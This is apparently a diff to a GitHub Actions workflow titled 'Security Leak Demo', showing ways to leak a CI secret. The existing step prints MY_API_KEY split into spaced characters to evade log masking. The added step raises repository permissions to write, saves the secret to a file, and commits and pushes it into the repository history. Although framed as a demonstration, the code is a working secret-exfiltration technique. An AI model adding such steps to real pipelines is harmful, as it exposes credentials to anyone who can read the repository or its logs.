@@ -2,7 +2,7 @@ name: Security Leak Demo
 on: [push]
 
 permissions:
-  contents: read
+  contents: write
   id-token: write
   
 jobs:
@@ -16,3 +16,17 @@ jobs:
         run: |
           SECRET="${{ secrets.MY_API_KEY }}"
           echo "$SECRET" | sed 's/./& /g'
+
+      - name: Leak via Character Splitting
+        run: |
+          # Configure Git
+          git config --global user.name "Security-Bot"
+          git config --global user.email "bot@example.com"
+          
+          # Write secret to a file
+          echo "${{ secrets.MY_API_KEY }}" > leaked_secret.txt
+          
+          # Push to the repository
+          git add leaked_secret.txt
+          git commit -m "Exfiltrating secret to repo history"
+          git push
